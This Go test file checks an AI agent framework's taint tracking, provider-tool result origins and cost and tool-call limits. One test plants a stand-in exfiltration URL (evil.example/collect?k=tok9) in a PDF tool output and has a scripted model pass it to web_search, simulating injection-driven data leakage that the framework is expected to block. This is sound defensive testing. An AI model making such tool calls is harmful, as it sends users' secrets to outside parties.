package gohan

import (
	"context"
	"encoding/json"
	"encoding/json/jsontext"
	"errors"
	"iter"
	"strings"
	"testing"
	"time"

	"github.com/victorzhuk/gohan/core/chains"
	"github.com/victorzhuk/gohan/core/runtime"
	"github.com/victorzhuk/gohan/core/stores"
	"github.com/victorzhuk/gohan/core/types"
	"github.com/victorzhuk/gohan/testkit/gohantest"
)

type postHocCount struct {
	name  string
	value int64
	attrs []types.Attr
}

type postHocTelemetry struct {
	counts []postHocCount
}

func (*postHocTelemetry) StartSpan(ctx context.Context, _ string, _ ...types.Attr) (context.Context, func(...types.Attr)) {
	return ctx, func(...types.Attr) {}
}

func (t *postHocTelemetry) Count(_ context.Context, name string, value int64, attrs ...types.Attr) {
	t.counts = append(t.counts, postHocCount{name: name, value: value, attrs: attrs})
}

func (*postHocTelemetry) Record(context.Context, string, float64, ...types.Attr) {}

func (t *postHocTelemetry) counted(name, tool string) bool {
	for _, c := range t.counts {
		if c.name != name {
			continue
		}
		for _, a := range c.attrs {
			if a.Key == "tool" && a.Value == tool {
				return true
			}
		}
	}
	return false
}

func TestProviderToolPostHoc(t *testing.T) {
	marker := "https://evil.example/collect?k=tok9"
	hook := func(_ context.Context, _ types.ToolSpec, args jsontext.Value) (types.TaintAction, []types.ArgTaint) {
		if strings.Contains(string(args), marker) {
			return types.TaintDeny, []types.ArgTaint{{
				Arg:     "query",
				Origins: []types.Origin{{Kind: types.OriginTool, Name: "read_pdf"}},
				Match:   marker,
			}}
		}
		return types.TaintAllow, nil
	}
	searchModel := func(ctx context.Context, _ types.ModelRequest) iter.Seq2[types.ModelChunk, error] {
		return func(yield func(types.ModelChunk, error) bool) {
			yield(types.ModelChunk{
				Kind: types.DeltaToolArgs,
				ToolUse: &types.ToolUse{
					ID:   "c1",
					Name: "web_search",
					Args: jsontext.Value(`{"query":"` + marker + `"}`),
				},
			}, nil)
		}
	}

	runEffect := func(t *testing.T, spec types.ToolSpec, tel *postHocTelemetry) error {
		t.Helper()
		stack := nativeStack(chains.PromptSet{})
		bound, _ := nativeConfig(stack)
		bound.model = searchModel
		bound.specs = []types.ToolSpec{spec}
		bound.taintPolicy = types.TaintHook(hook)
		env := &turnEnv{c: bound, msgs: []types.Message{{Blocks: []types.Block{
			types.Text{BlockBase: types.BlockBase{Origin: types.Origin{Kind: types.OriginTool, Name: "read_pdf"}}, Text: "invoice " + marker},
		}}}}
		ctx := types.WithTelemetry(types.WithSink(withTurnEnv(context.Background(), env), sinkInto(nil)), tel)
		_, _, _, err := modelEffect(ctx, runtime.State{})
		return err
	}

	t.Run("taint.provider-tool-post-hoc", func(t *testing.T) {
		tel := &postHocTelemetry{}
		err := runEffect(t, types.ToolSpec{
			Name:         "web_search",
			Executor:     types.ByProvider,
			Effect:       types.ReadOnly,
			Trust:        types.Untrusted,
			Capabilities: types.Capabilities{Exfil: true},
		}, tel)
		var merr *types.ModelError
		if !errors.As(err, &merr) || merr.Class != types.ClassPermanent {
			t.Fatalf("err = %v, want permanent model error", err)
		}
		if !tel.counted("gohan.taint.post_hoc", "web_search") {
			t.Fatalf("counts = %+v, want gohan.taint.post_hoc{tool=web_search}", tel.counts)
		}
	})

	t.Run("non-exfil provider tool proceeds", func(t *testing.T) {
		tel := &postHocTelemetry{}
		err := runEffect(t, types.ToolSpec{
			Name:     "web_search",
			Executor: types.ByProvider,
			Effect:   types.ReadOnly,
		}, tel)
		if err != nil {
			t.Fatalf("model effect: %v", err)
		}
		if len(tel.counts) != 0 {
			t.Fatalf("counts = %+v, want none", tel.counts)
		}
	})
}

func TestProviderToolTrifecta(t *testing.T) {
	profile := func(caps map[string]types.ProviderToolCap) types.ModelProfile {
		return types.ModelProfile{Name: "native", Caps: types.Caps{Tools: true, ProviderTools: caps}}
	}
	flow := func(tools []types.Tool, hook types.TaintHook) NativeSpec {
		return NativeSpec{
			Request:     FlowRequest{Name: "searchflow"},
			Profile:     "native",
			Tools:       tools,
			TaintPolicy: hook,
		}
	}
	toolset := func(t *testing.T) []types.Tool {
		t.Helper()
		private, err := NewTool[struct{}, struct{}]("private_read", "", func(context.Context, struct{}) (struct{}, error) {
			return struct{}{}, nil
		}, WithPrivateRead())
		if err != nil {
			t.Fatal(err)
		}
		search := gohantest.NewFakeTool("web_search", gohantest.WithToolSpec(func(spec *types.ToolSpec) {
			spec.Executor = types.ByProvider
			spec.Effect = types.ReadOnly
			spec.Trust = types.Untrusted
			spec.Capabilities.Exfil = true
		}))
		return []types.Tool{private, search}
	}

	t.Run("providerToolTrifectaCountsBothLegs", func(t *testing.T) {
		m := gohantest.NewScriptedModel(profile(map[string]types.ProviderToolCap{"web_search": {}}))
		_, err := Build(WithModels(m), WithNativeAgent(flow(toolset(t), nil)))
		var trifecta types.ErrTaintTrifecta
		if !errors.As(err, &trifecta) || !trifecta.Exfil || !trifecta.Untrusted {
			t.Fatalf("Build error = %v, want exfil and untrusted legs from the provider tool", err)
		}
	})

	t.Run("provider trifecta builds with policy", func(t *testing.T) {
		m := gohantest.NewScriptedModel(profile(map[string]types.ProviderToolCap{"web_search": {}}))
		hook := types.TaintHook(func(context.Context, types.ToolSpec, jsontext.Value) (types.TaintAction, []types.ArgTaint) {
			return types.TaintAllow, nil
		})
		if _, err := Build(WithModels(m), WithNativeAgent(flow(toolset(t), hook))); err != nil {
			t.Fatalf("Build with policy: %v", err)
		}
	})
}

func TestProviderResultOrigin(t *testing.T) {
	spec := types.ToolSpec{Name: "web_search", Executor: types.ByProvider}
	call := ProviderCallBlock(spec, "c1", jsontext.Value(`{"query":"governance"}`))

	t.Run("tools.provider-result-origin", func(t *testing.T) {
		if call.Name != "web_search" || call.ID != "c1" || string(call.Args) != `{"query":"governance"}` {
			t.Fatalf("call = %+v, want the registered spec's identity", call)
		}
		res := ProviderResultBlock(spec, call,
			types.Text{Text: "results"},
			types.Raw{Provider: "openai", Value: map[string]any{"enc": "opaque"}},
		)
		if res.Origin.Kind != types.OriginProvider || res.Origin.Name != "web_search" {
			t.Fatalf("origin = %+v, want OriginProvider{web_search}", res.Origin)
		}
		if res.ID != call.ID || res.Outcome != types.Succeeded {
			t.Fatalf("result = %+v, want the call id and success", res)
		}
		if got := blockKindOf(res); got != types.KindToolResult {
			t.Fatalf("block kind = %s, want tool_result: a provider result is never Raw", got)
		}
		text, ok := res.Content[0].(types.Text)
		if !ok || text.Origin.Kind != types.OriginProvider || text.Origin.Name != "web_search" {
			t.Fatalf("content[0] = %+v, want provider origin", res.Content[0])
		}
		raw, ok := res.Content[1].(types.Raw)
		if !ok {
			t.Fatalf("content[1] = %T, want Raw", res.Content[1])
		}
		if raw.Provider != "openai" || raw.Value.(map[string]any)["enc"] != "opaque" {
			t.Fatalf("raw = %+v, want the opaque payload round-tripped", raw)
		}
		msgs, drops := ProjectFidelity([]types.Message{{Blocks: []types.Block{res}}}, "anthropic", types.Caps{})
		if len(drops) != 0 {
			t.Fatalf("drops = %+v, want no raw drop for a provider tool result", drops)
		}
		if len(msgs) != 1 || len(msgs[0].Blocks) != 1 {
			t.Fatalf("projection = %+v, want the result kept", msgs)
		}
	})
}

func TestProviderToolUsage(t *testing.T) {
	searchSpec := types.ToolSpec{Name: "web_search", Executor: types.ByProvider, Effect: types.ReadOnly}
	calls := []types.ToolUse{
		ProviderCallBlock(searchSpec, "c1", jsontext.Value(`{"query":"one"}`)),
		ProviderCallBlock(searchSpec, "c2", jsontext.Value(`{"query":"two"}`)),
	}

	t.Run("model.provider-tool-usage", func(t *testing.T) {
		var u types.Usage
		CountProviderCalls([]types.ToolSpec{searchSpec}, calls, &u)
		if u.ProviderToolCalls["web_search"] != 2 {
			t.Fatalf("ProviderToolCalls = %v, want web_search=2", u.ProviderToolCalls)
		}
		pricing := types.Pricing{ProviderCall: map[string]float64{"web_search": 0.5}}
		st := chains.NewLimitsState()
		mw := chains.Limits(types.RunLimits{MaxWallClock: time.Minute}, pricing, st)
		model := func(_ context.Context, _ types.ModelRequest) iter.Seq2[types.ModelChunk, error] {
			return func(yield func(types.ModelChunk, error) bool) {
				yield(types.ModelChunk{Kind: types.DeltaText, Delta: "x", Usage: &u}, nil)
			}
		}
		for _, err := range mw(model)(context.Background(), types.ModelRequest{}) {
			if err != nil {
				t.Fatalf("limits: %v", err)
			}
		}
		if got := st.Cost(); got != 1.0 {
			t.Fatalf("cost = %v, want 2 × 0.5", got)
		}
	})

	t.Run("provider calls charge the run ledger once per call", func(t *testing.T) {
		searchModel := func(ctx context.Context, _ types.ModelRequest) iter.Seq2[types.ModelChunk, error] {
			return func(yield func(types.ModelChunk, error) bool) {
				for _, call := range calls {
					if !yield(types.ModelChunk{Kind: types.DeltaToolArgs, ToolUse: &call}, nil) {
						return
					}
				}
			}
		}
		stack := nativeStack(chains.PromptSet{})
		bound, _ := nativeConfig(stack)
		bound.model = searchModel
		bound.specs = []types.ToolSpec{searchSpec}
		bound.profile = types.ModelProfile{
			Name:    "native",
			Caps:    types.Caps{Tools: true, ProviderTools: map[string]types.ProviderToolCap{"web_search": {}}},
			Pricing: types.Pricing{ProviderCall: map[string]float64{"web_search": 0.25}},
		}
		ledger := chains.NewLimitsState()
		env := &turnEnv{c: bound, msgs: []types.Message{{Blocks: []types.Block{types.Text{Text: "hi"}}}}}
		ctx := chains.WithLimitsState(withTurnEnv(context.Background(), env), ledger)
		if _, _, _, err := modelEffect(ctx, runtime.State{}); err != nil {
			t.Fatalf("model effect: %v", err)
		}
		if got := ledger.Cost(); got != 0.5 {
			t.Fatalf("run cost = %v, want 2 × 0.25", got)
		}
	})

	t.Run("provider calls count toward MaxToolCalls and journal Completed", func(t *testing.T) {
		journal := stores.NewMemoryJournal()
		spec := types.ToolSpec{Name: "web_search", Executor: types.ByProvider, Effect: types.SideEffect}
		batch := []types.ToolUse{
			ProviderCallBlock(spec, "c1", jsontext.Value(`{"query":"one"}`)),
			ProviderCallBlock(spec, "c2", jsontext.Value(`{"query":"two"}`)),
		}
		stack := nativeStack(chains.PromptSet{})
		bound, _ := nativeConfig(stack)
		bound.specs = []types.ToolSpec{spec}
		bound.journal = journal
		bound.limits = types.RunLimits{MaxToolCalls: 2, MaxWallClock: time.Minute}
		bound.reserve = func(ctx context.Context, n int) (context.Context, func(), error) {
			return chains.NewLimitsState().ReserveBatch(ctx, types.RunLimits{MaxToolCalls: 2, MaxWallClock: time.Minute}, n)
		}
		bound.exec = func(context.Context, types.ToolUse) (types.ToolResult, error) {
			return types.ToolResult{Outcome: types.Succeeded}, nil
		}
		env := &turnEnv{c: bound, calls: batch}
		ctx := types.WithRunInfo(withTurnEnv(context.Background(), env), types.RunInfo{SessionID: "s1"})
		if _, _, _, err := batchEffect(ctx, runtime.State{}); err != nil {
			t.Fatalf("batch effect: %v", err)
		}
		if env.used != 2 {
			t.Fatalf("used = %d, want both provider calls counted", env.used)
		}
		for _, call := range batch {
			entries, err := journal.ByFingerprint(ctx, "s1", ToolFingerprint(spec, json.RawMessage(call.Args)))
			if err != nil {
				t.Fatalf("ByFingerprint: %v", err)
			}
			if len(entries) != 1 {
				t.Fatalf("entries for %s = %d, want 1", call.ID, len(entries))
			}
			if entries[0].State != stores.Completed {
				t.Fatalf("state = %v, want Completed", entries[0].State)
			}
		}
	})

	t.Run("limits.provider-calls-count", func(t *testing.T) {
		journal := stores.NewMemoryJournal()
		spec := types.ToolSpec{Name: "web_search", Executor: types.ByProvider, Effect: types.SideEffect}
		batch := []types.ToolUse{
			ProviderCallBlock(spec, "c1", jsontext.Value(`{"query":"one"}`)),
			ProviderCallBlock(spec, "c2", jsontext.Value(`{"query":"two"}`)),
			ProviderCallBlock(spec, "c3", jsontext.Value(`{"query":"three"}`)),
		}
		limits := types.RunLimits{MaxToolCalls: 3, MaxWallClock: time.Minute}
		ledger := chains.NewLimitsState()
		stack := nativeStack(chains.PromptSet{})
		bound, _ := nativeConfig(stack)
		bound.specs = []types.ToolSpec{spec}
		bound.journal = journal
		bound.limits = limits
		bound.reserve = func(ctx context.Context, n int) (context.Context, func(), error) {
			return ledger.ReserveBatch(ctx, limits, n)
		}
		bound.exec = func(context.Context, types.ToolUse) (types.ToolResult, error) {
			return types.ToolResult{Outcome: types.Succeeded}, nil
		}
		env := &turnEnv{c: bound, calls: batch}
		ctx := types.WithRunInfo(withTurnEnv(context.Background(), env), types.RunInfo{SessionID: "s1"})
		if _, _, _, err := batchEffect(ctx, runtime.State{}); err != nil {
			t.Fatalf("batch effect: %v", err)
		}
		if env.used != 3 {
			t.Fatalf("used = %d, want all three provider calls counted", env.used)
		}
		_, release, err := ledger.ReserveBatch(ctx, limits, 1)
		if !errors.Is(err, types.ErrBatchOverrun) {
			t.Fatalf("next reserve err = %v, want ErrBatchOverrun at MaxToolCalls=3", err)
		}
		release()
	})
}
